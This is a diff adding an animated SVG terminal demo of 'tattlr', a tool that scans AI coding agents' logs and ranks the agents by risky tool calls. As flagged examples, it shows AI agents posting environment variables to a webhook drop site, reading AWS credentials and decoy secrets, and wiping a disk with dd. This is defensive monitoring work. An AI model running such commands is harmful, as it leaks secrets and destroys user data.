@@ -1,0 +1,78 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="883" height="938" viewBox="0 0 883 938" role="img" aria-label="tattlr scan output">
+<title>tattlr scan finding risky agent tool calls, then failing a CI check with --fail-on</title>
+<style>text{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,'Liberation Mono',monospace;font-size:14px;fill:#cdd6f4;white-space:pre}.b{font-weight:bold}.d{opacity:.55}.p{fill:#a6e3a1}.l{opacity:0;animation:15.15s linear infinite}@keyframes k0{0%,3.962%{opacity:0}3.972%,99%{opacity:1}100%{opacity:0}}#l0{animation-name:k0}@keyframes t0{0%,3.962%{width:0}7.230%,100%{width:94.7px}}.w0{animation:t0 15.15s steps(11) infinite;animation-timing-function:linear}@keyframes k1{0%,9.871%{opacity:0}9.881%,99%{opacity:1}100%{opacity:0}}#l1{animation-name:k1}@keyframes k2{0%,10.267%{opacity:0}10.277%,99%{opacity:1}100%{opacity:0}}#l2{animation-name:k2}#r2_1{animation-name:k2}@keyframes k3{0%,10.664%{opacity:0}10.674%,99%{opacity:1}100%{opacity:0}}#l3{animation-name:k3}@keyframes k4{0%,11.060%{opacity:0}11.070%,99%{opacity:1}100%{opacity:0}}#l4{animation-name:k4}@keyframes k5{0%,11.456%{opacity:0}11.466%,99%{opacity:1}100%{opacity:0}}#l5{animation-name:k5}@keyframes k6{0%,11.852%{opacity:0}11.862%,99%{opacity:1}100%{opacity:0}}#l6{animation-name:k6}@keyframes k7{0%,12.248%{opacity:0}12.258%,99%{opacity:1}100%{opacity:0}}#l7{animation-name:k7}@keyframes k8{0%,12.644%{opacity:0}12.654%,99%{opacity:1}100%{opacity:0}}#l8{animation-name:k8}#r8_1{animation-name:k8}@keyframes k9{0%,13.041%{opacity:0}13.051%,99%{opacity:1}100%{opacity:0}}#l9{animation-name:k9}#r9_1{animation-name:k9}@keyframes k10{0%,13.437%{opacity:0}13.447%,99%{opacity:1}100%{opacity:0}}#l10{animation-name:k10}#r10_1{animation-name:k10}@keyframes k11{0%,13.833%{opacity:0}13.843%,99%{opacity:1}100%{opacity:0}}#l11{animation-name:k11}#r11_1{animation-name:k11}@keyframes k12{0%,14.229%{opacity:0}14.239%,99%{opacity:1}100%{opacity:0}}#l12{animation-name:k12}@keyframes k13{0%,14.625%{opacity:0}14.635%,99%{opacity:1}100%{opacity:0}}#l13{animation-name:k13}@keyframes k14{0%,15.021%{opacity:0}15.031%,99%{opacity:1}100%{opacity:0}}#l14{animation-name:k14}@keyframes k15{0%,15.418%{opacity:0}15.428%,99%{opacity:1}100%{opacity:0}}#l15{animation-name:k15}#r15_1{animation-name:k15}@keyframes k16{0%,15.814%{opacity:0}15.824%,99%{opacity:1}100%{opacity:0}}#l16{animation-name:k16}#r16_1{animation-name:k16}@keyframes k17{0%,16.210%{opacity:0}16.220%,99%{opacity:1}100%{opacity:0}}#l17{animation-name:k17}#r17_1{animation-name:k17}@keyframes k18{0%,16.606%{opacity:0}16.616%,99%{opacity:1}100%{opacity:0}}#l18{animation-name:k18}#r18_1{animation-name:k18}@keyframes k19{0%,17.002%{opacity:0}17.012%,99%{opacity:1}100%{opacity:0}}#l19{animation-name:k19}@keyframes k20{0%,17.398%{opacity:0}17.408%,99%{opacity:1}100%{opacity:0}}#l20{animation-name:k20}@keyframes k21{0%,17.795%{opacity:0}17.805%,99%{opacity:1}100%{opacity:0}}#l21{animation-name:k21}@keyframes k22{0%,18.191%{opacity:0}18.201%,99%{opacity:1}100%{opacity:0}}#l22{animation-name:k22}@keyframes k23{0%,18.587%{opacity:0}18.597%,99%{opacity:1}100%{opacity:0}}#l23{animation-name:k23}@keyframes k24{0%,18.983%{opacity:0}18.993%,99%{opacity:1}100%{opacity:0}}#l24{animation-name:k24}@keyframes k25{0%,19.379%{opacity:0}19.389%,99%{opacity:1}100%{opacity:0}}#l25{animation-name:k25}@keyframes k26{0%,19.776%{opacity:0}19.786%,99%{opacity:1}100%{opacity:0}}#l26{animation-name:k26}#r26_1{animation-name:k26}@keyframes k27{0%,20.172%{opacity:0}20.182%,99%{opacity:1}100%{opacity:0}}#l27{animation-name:k27}@keyframes k28{0%,20.568%{opacity:0}20.578%,99%{opacity:1}100%{opacity:0}}#l28{animation-name:k28}@keyframes k29{0%,20.964%{opacity:0}20.974%,99%{opacity:1}100%{opacity:0}}#l29{animation-name:k29}#r29_1{animation-name:k29}@keyframes k30{0%,21.360%{opacity:0}21.370%,99%{opacity:1}100%{opacity:0}}#l30{animation-name:k30}@keyframes k31{0%,21.756%{opacity:0}21.766%,99%{opacity:1}100%{opacity:0}}#l31{animation-name:k31}@keyframes k32{0%,22.153%{opacity:0}22.163%,99%{opacity:1}100%{opacity:0}}#l32{animation-name:k32}#r32_1{animation-name:k32}@keyframes k33{0%,22.549%{opacity:0}22.559%,99%{opacity:1}100%{opacity:0}}#l33{animation-name:k33}@keyframes k34{0%,22.945%{opacity:0}22.955%,99%{opacity:1}100%{opacity:0}}#l34{animation-name:k34}@keyframes k35{0%,23.341%{opacity:0}23.351%,99%{opacity:1}100%{opacity:0}}#l35{animation-name:k35}#r35_1{animation-name:k35}@keyframes k36{0%,23.737%{opacity:0}23.747%,99%{opacity:1}100%{opacity:0}}#l36{animation-name:k36}@keyframes k37{0%,24.133%{opacity:0}24.143%,99%{opacity:1}100%{opacity:0}}#l37{animation-name:k37}@keyframes k38{0%,24.530%{opacity:0}24.540%,99%{opacity:1}100%{opacity:0}}#l38{animation-name:k38}#r38_1{animation-name:k38}@keyframes k39{0%,24.926%{opacity:0}24.936%,99%{opacity:1}100%{opacity:0}}#l39{animation-name:k39}@keyframes k40{0%,25.322%{opacity:0}25.332%,99%{opacity:1}100%{opacity:0}}#l40{animation-name:k40}@keyframes k41{0%,25.718%{opacity:0}25.728%,99%{opacity:1}100%{opacity:0}}#l41{animation-name:k41}@keyframes k42{0%,26.114%{opacity:0}26.124%,99%{opacity:1}100%{opacity:0}}#l42{animation-name:k42}@keyframes k43{0%,26.510%{opacity:0}26.520%,99%{opacity:1}100%{opacity:0}}#l43{animation-name:k43}@keyframes k44{0%,26.907%{opacity:0}26.917%,99%{opacity:1}100%{opacity:0}}#l44{animation-name:k44}@keyframes k45{0%,37.471%{opacity:0}37.481%,99%{opacity:1}100%{opacity:0}}#l45{animation-name:k45}@keyframes t45{0%,37.471%{width:0}57.082%,100%{width:558.4px}}.w45{animation:t45 15.15s steps(66) infinite;animation-timing-function:linear}@keyframes k46{0%,59.723%{opacity:0}59.733%,99%{opacity:1}100%{opacity:0}}#l46{animation-name:k46}@keyframes k47{0%,63.684%{opacity:0}63.694%,99%{opacity:1}100%{opacity:0}}#l47{animation-name:k47}</style>
+<rect width="100%" height="100%" rx="10" fill="#1e1e2e"/>
+<circle cx="24" cy="17" r="6" fill="#f38ba8"/>
+<circle cx="44" cy="17" r="6" fill="#f9e2af"/>
+<circle cx="64" cy="17" r="6" fill="#a6e3a1"/>
+<text x="441" y="22" style="fill:#7f849c;font-size:12px" text-anchor="middle">~/code</text>
+<g id="l0" class="l"><text x="20" y="68"><tspan class="p">$ </tspan></text>
+<clipPath id="c0"><rect x="36.9" y="54" height="18" width="0" class="w0"/></clipPath>
+<text x="36.9" y="68" clip-path="url(#c0)">tattlr scan</text>
+</g>
+<text id="l1" class="l" x="20" y="86"></text>
+<rect class="l" id="r2_1" x="28.4" y="91" width="67.4" height="17" fill="#d70000"/>
+<text id="l2" class="l" x="20" y="104"> <tspan class="b" style="fill:#ffffff"> TATTLR </tspan>  <tspan class="b">RAP SHEET</tspan>  <tspan class="d">11 sessions, 45 tool calls, Aug 3 2025 to Nov 8 2026</tspan></text>
+<text id="l3" class="l" x="20" y="122"></text>
+<text id="l4" class="l" x="20" y="140"> 32 of 45 tool calls looked sketchy. Most wanted: claude-code (public enemy).</text>
+<text id="l5" class="l" x="20" y="158"> The fake keys got read 4 times. Nobody asked for them.</text>
+<text id="l6" class="l" x="20" y="176"></text>
+<text id="l7" class="l" x="20" y="194"> <tspan class="b">AGENT         SESSIONS  CALLS  FLAGGED  CRIT  HIGH   MED   LOW  SCORE  VERDICT</tspan></text>
+<rect class="l" id="r8_1" x="357.2" y="199" width="42.1" height="17" fill="#d70000"/>
+<text id="l8" class="l" x="20" y="212"> claude-code          4     21       14 <tspan class="b" style="fill:#ffffff">    4</tspan> <tspan class="b" style="fill:#f38ba8">   10</tspan> <tspan style="fill:#f9e2af">    4</tspan> <tspan class="d">    1</tspan>    193  <tspan class="b" style="fill:#f38ba8">public enemy</tspan></text>
+<rect class="l" id="r9_1" x="357.2" y="217" width="42.1" height="17" fill="#d70000"/>
+<text id="l9" class="l" x="20" y="230"> codex                2      9        6 <tspan class="b" style="fill:#ffffff">    1</tspan> <tspan class="b" style="fill:#f38ba8">    5</tspan> <tspan style="fill:#f9e2af">    5</tspan> <tspan class="d">    0</tspan>     80  <tspan style="fill:#f38ba8">menace</tspan></text>
+<rect class="l" id="r10_1" x="357.2" y="235" width="42.1" height="17" fill="#d70000"/>
+<text id="l10" class="l" x="20" y="248"> gemini-cli           2      6        5 <tspan class="b" style="fill:#ffffff">    2</tspan> <tspan class="b" style="fill:#f38ba8">    3</tspan> <tspan style="fill:#f9e2af">    1</tspan> <tspan class="d">    0</tspan>     77  <tspan style="fill:#f38ba8">menace</tspan></text>
+<rect class="l" id="r11_1" x="357.2" y="253" width="42.1" height="17" fill="#d70000"/>
+<text id="l11" class="l" x="20" y="266"> openclaw             2      5        4 <tspan class="b" style="fill:#ffffff">    1</tspan> <tspan class="b" style="fill:#f38ba8">    4</tspan> <tspan style="fill:#f9e2af">    1</tspan> <tspan class="d">    0</tspan>     60  <tspan style="fill:#f38ba8">menace</tspan></text>
+<text id="l12" class="l" x="20" y="284"> cursor               1      4        3 <tspan class="d">    0</tspan> <tspan class="b" style="fill:#f38ba8">    3</tspan> <tspan style="fill:#f9e2af">    1</tspan> <tspan class="d">    0</tspan>     27  repeat offender</text>
+<text id="l13" class="l" x="20" y="302"></text>
+<text id="l14" class="l" x="20" y="320"> <tspan class="b">TOP OFFENSES</tspan></text>
+<rect class="l" id="r15_1" x="87.4" y="325" width="33.7" height="17" fill="#d70000"/>
+<text id="l15" class="l" x="20" y="338">    4x  <tspan class="b" style="fill:#ffffff">CRIT</tspan>  Touched a tattlr canary                    <tspan class="d">claude-code, openclaw</tspan></text>
+<rect class="l" id="r16_1" x="87.4" y="343" width="33.7" height="17" fill="#d70000"/>
+<text id="l16" class="l" x="20" y="356">    2x  <tspan class="b" style="fill:#ffffff">CRIT</tspan>  Piped a remote script into a shell         <tspan class="d">claude-code, gemini-cli</tspan></text>
+<rect class="l" id="r17_1" x="87.4" y="361" width="33.7" height="17" fill="#d70000"/>
+<text id="l17" class="l" x="20" y="374">    1x  <tspan class="b" style="fill:#ffffff">CRIT</tspan>  Wrote straight to a disk device            <tspan class="d">gemini-cli</tspan></text>
+<rect class="l" id="r18_1" x="87.4" y="379" width="33.7" height="17" fill="#d70000"/>
+<text id="l18" class="l" x="20" y="392">    1x  <tspan class="b" style="fill:#ffffff">CRIT</tspan>  Sent secrets over the network              <tspan class="d">codex</tspan></text>
+<text id="l19" class="l" x="20" y="410">    8x  <tspan class="b" style="fill:#f38ba8">HIGH</tspan>  Read a secret file                         <tspan class="d">claude-code, cursor, gemini-cli, openclaw</tspan></text>
+<text id="l20" class="l" x="20" y="428">    3x  <tspan class="b" style="fill:#f38ba8">HIGH</tspan>  Edited its own config or hooks             <tspan class="d">claude-code, cursor, gemini-cli</tspan></text>
+<text id="l21" class="l" x="20" y="446">    3x  <tspan class="b" style="fill:#f38ba8">HIGH</tspan>  Talked to a paste or webhook drop site     <tspan class="d">codex, gemini-cli, openclaw</tspan></text>
+<text id="l22" class="l" x="20" y="464">    2x  <tspan class="b" style="fill:#f38ba8">HIGH</tspan>  Force pushed                               <tspan class="d">claude-code, cursor</tspan></text>
+<text id="l23" class="l" x="20" y="482"> <tspan class="d">  ...and 14 more kinds, see --json</tspan></text>
+<text id="l24" class="l" x="20" y="500"></text>
+<text id="l25" class="l" x="20" y="518"> <tspan class="b">WORST MOMENTS</tspan></text>
+<rect class="l" id="r26_1" x="28.4" y="523" width="33.7" height="17" fill="#d70000"/>
+<text id="l26" class="l" x="20" y="536"> <tspan class="b" style="fill:#ffffff">CRIT</tspan>  Oct 22 14:04  <tspan class="b">codex</tspan>  <tspan class="d">~/code/landing-page</tspan></text>
+<text id="l27" class="l" x="20" y="554">       Sent secrets over the network, Talked to a paste or webhook drop site +2 more</text>
+<text id="l28" class="l" x="20" y="572">       <tspan style="fill:#94e2d5">printenv | curl -s -X POST --data-binary @- https://webhook.site/5f1e2d3c</tspan></text>
+<rect class="l" id="r29_1" x="28.4" y="577" width="33.7" height="17" fill="#d70000"/>
+<text id="l29" class="l" x="20" y="590"> <tspan class="b" style="fill:#ffffff">CRIT</tspan>  Oct 27 11:00  <tspan class="b">claude-code</tspan>  <tspan class="d">~/code/billing-api</tspan></text>
+<text id="l30" class="l" x="20" y="608">       Touched a tattlr canary, Dumped environment variables</text>
+<text id="l31" class="l" x="20" y="626">       <tspan style="fill:#94e2d5">env | sort</tspan></text>
+<rect class="l" id="r32_1" x="28.4" y="631" width="33.7" height="17" fill="#d70000"/>
+<text id="l32" class="l" x="20" y="644"> <tspan class="b" style="fill:#ffffff">CRIT</tspan>  Oct 26 20:31  <tspan class="b">openclaw</tspan>  <tspan class="d">~/.openclaw/workspace</tspan></text>
+<text id="l33" class="l" x="20" y="662">       Touched a tattlr canary, Read a secret file</text>
+<text id="l34" class="l" x="20" y="680">       <tspan style="fill:#94e2d5">read ~/.config/tattlr/decoy/.env</tspan></text>
+<rect class="l" id="r35_1" x="28.4" y="685" width="33.7" height="17" fill="#d70000"/>
+<text id="l35" class="l" x="20" y="698"> <tspan class="b" style="fill:#ffffff">CRIT</tspan>  Oct 25 17:41  <tspan class="b">gemini-cli</tspan>  <tspan class="d">~/code/infra-scripts</tspan></text>
+<text id="l36" class="l" x="20" y="716">       Wrote straight to a disk device, Used sudo</text>
+<text id="l37" class="l" x="20" y="734">       <tspan style="fill:#94e2d5">sudo dd if=/dev/zero of=/dev/sdb bs=4M status=progress</tspan></text>
+<rect class="l" id="r38_1" x="28.4" y="739" width="33.7" height="17" fill="#d70000"/>
+<text id="l38" class="l" x="20" y="752"> <tspan class="b" style="fill:#ffffff">CRIT</tspan>  Oct 24 23:14  <tspan class="b">claude-code</tspan>  <tspan class="d">~/code/dotfiles</tspan></text>
+<text id="l39" class="l" x="20" y="770">       Touched a tattlr canary, Read a secret file</text>
+<text id="l40" class="l" x="20" y="788">       <tspan style="fill:#94e2d5">cat ~/.aws/credentials</tspan></text>
+<text id="l41" class="l" x="20" y="806"></text>
+<text id="l42" class="l" x="20" y="824"> <tspan class="d">Read 15 log files on this machine. Nothing was uploaded. Secrets in commands are masked.</tspan></text>
+<text id="l43" class="l" x="20" y="842"> <tspan class="d">Next: `tattlr protect install` blocks this stuff before it runs. YOLO mode stays on.</tspan></text>
+<text id="l44" class="l" x="20" y="860"></text>
+<g id="l45" class="l"><text x="20" y="878"><tspan class="p">$ </tspan></text>
+<clipPath id="c45"><rect x="36.9" y="864" height="18" width="0" class="w45"/></clipPath>
+<text x="36.9" y="878" clip-path="url(#c45)">tattlr scan --since 30d --fail-on high &gt; /dev/null; echo &quot;exit $?&quot;</text>
+</g>
+<text id="l46" class="l" x="20" y="896">exit 1</text>
+<g id="l47" class="l"><text x="20" y="914"><tspan class="p">$ </tspan></text>
+</g>
+</svg>
